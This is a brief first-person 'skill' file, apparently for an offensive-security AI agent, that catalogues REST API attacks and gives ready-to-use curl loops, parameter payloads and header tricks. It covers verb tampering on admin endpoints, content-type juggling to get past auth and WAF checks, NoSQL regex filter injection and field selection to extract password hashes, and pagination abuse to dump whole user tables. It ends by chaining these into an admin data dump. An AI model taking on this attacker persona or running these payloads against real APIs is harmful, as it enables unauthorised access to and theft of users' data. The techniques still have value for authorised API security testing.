# SKILL: REST API Attacks
## Version: 1.0 | Domain: api

---

## IDENTITY
REST APIs expose CRUD on resources. I attack: IDOR/BOLA, mass assignment, verb tampering, content-type juggling, pagination bypass, filter injection, sort injection.

## EXPLOITATION
### Verb tampering
```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -sk -X $m -o /dev/null -w "$m %{http_code}\n" https://target/api/admin/users
done
```

### Content-Type juggling
```http
Content-Type: application/json    → 403
Content-Type: application/xml     → 200 (different parser, no auth check)
Content-Type: text/plain           → 200 (WAF bypass)
```

### Filter / Sort injection
```
GET /api/users?sort=password      → leaks via sorted output
GET /api/users?filter[password][$regex]=^a    → NoSQL operator injection
GET /api/users?fields=id,email,password_hash   → field selection abuse
```

### Pagination bypass
```
GET /api/users?page=1&per_page=10000   → dump all
GET /api/users?limit=-1                → some frameworks return all
GET /api/users?offset=0&count=999999
```

### HATEOAS link following
Follow `_links` in responses; some link to admin endpoints.

## CHAIN POTENTIAL
Verb tamper + filter injection → admin data dump.

## SEVERITY
7.0–9.0.

## REFERENCES
OWASP API Security Top 10
